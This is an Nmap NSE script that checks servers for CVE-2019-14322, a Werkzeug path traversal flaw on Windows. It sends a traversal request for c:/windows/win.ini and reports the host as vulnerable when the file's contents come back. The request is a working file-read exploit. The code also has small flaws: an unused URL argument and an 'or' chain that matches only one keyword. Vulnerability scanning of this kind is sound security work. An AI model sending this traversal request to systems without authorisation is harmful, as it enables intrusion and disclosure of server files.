local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"
local stdnse = require "stdnse"
local string = require "string"

description = [[

CVE-2019-14322 - A vulnerability was found in Pallets Werkzeug up to 0.15.4. It has been declared as critical. 
This vulnerability affects the function SharedDataMiddleware of the component Windows. 
The manipulation with an unknown input leads to a directory traversal vulnerability. The CWE definition for the vulnerability is CWE-22.
This script reads c:/windows/win.ini as a proof of concept.
This vulnerability is running on (cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*, cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:x64:*)

]]

---
-- @usage
-- nmap --script http-vuln-cve2019-14322.nse -p <port> <target>
--
-- @output
-- PORT    STATE SERVICE
-- s4430/tcp  open  http
-- | http-vuln-cve2019-14322:
-- |   VULNERABLE
-- |   Pallets Werkzeug path traversal via SharedDataMiddleware mishandles drive names (such as C:) in Windows pathnames
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2019-14322
-- |
-- |     Disclosure date: 2019-07-28
-- |     References:
-- |      https://vuldb.com/?id.138886 
-- |      https://palletsprojects.com/blog/werkzeug-0-15-5-released/
-- |_     https://www.cvedetails.com/cve/CVE-2019-14322/ 
--
-- @args http-vuln-cve2019-14322.method The HTTP method for the request. The default method is "GET".
-- @args http-vuln-cve2019-14322.path The URL path to request. The default path is "/".

author = "faisalfs10x"
license = "Same as Nmap --See https://nmap.org/book/man-legal.html"
categories = { "vuln","exploit" }

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = "Pallets Werkzeug path traversal via SharedDataMiddleware mishandles drive names (such as C:) in Windows pathnames",
    state = vulns.STATE.NOT_VULN,
    description = [[
		
A vulnerability was found in Pallets Werkzeug up to 0.15.4. It has been declared as critical. 
This vulnerability affects the function SharedDataMiddleware of the component Windows. 
The manipulation with an unknown input leads to a directory traversal vulnerability. The CWE definition for the vulnerability is CWE-22.
This script reads c:/windows/win.ini as a proof of concept.
This vulnerability is running on (cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:*:*, cpe:2.3:o:microsoft:windows:-:*:*:*:*:*:x64:*)
		
    ]],
    IDS = {
        CVE = "CVE-2019-14322"
    },
    references = {
        'https://vuldb.com/?id.138886',
        'https://palletsprojects.com/blog/werkzeug-0-15-5-released/',
	'https://www.cvedetails.com/cve/CVE-2019-14322/'
    },
    dates = {
        disclosure = { year = '2019', month = '07', day = '28' }
    }
  }

-- The script request '$URL/base_import/static/c:/windows/win.ini' from the server as PoC. If the server responded stated string, then we have vuln host :-)
 options = {header={}}    options['header']['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"    

 --local req = http.get(host, port, uri, options) 
 local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 local arg_url = stdnse.get_script_args(SCRIPT_NAME..".url") or "/base_import/static/c:/windows/win.ini"
 local response = http.generic_request(host, port, "GET", "/base_import/static/c:/windows/win.ini", options)

 if response.status == 200 and string.match(response.body, "extensions" or "files" or "fonts")  then
 -- if response.status == 200 then
 vuln.state = vulns.STATE.VULN
 end

 return vuln_report:make_output(vuln)
end
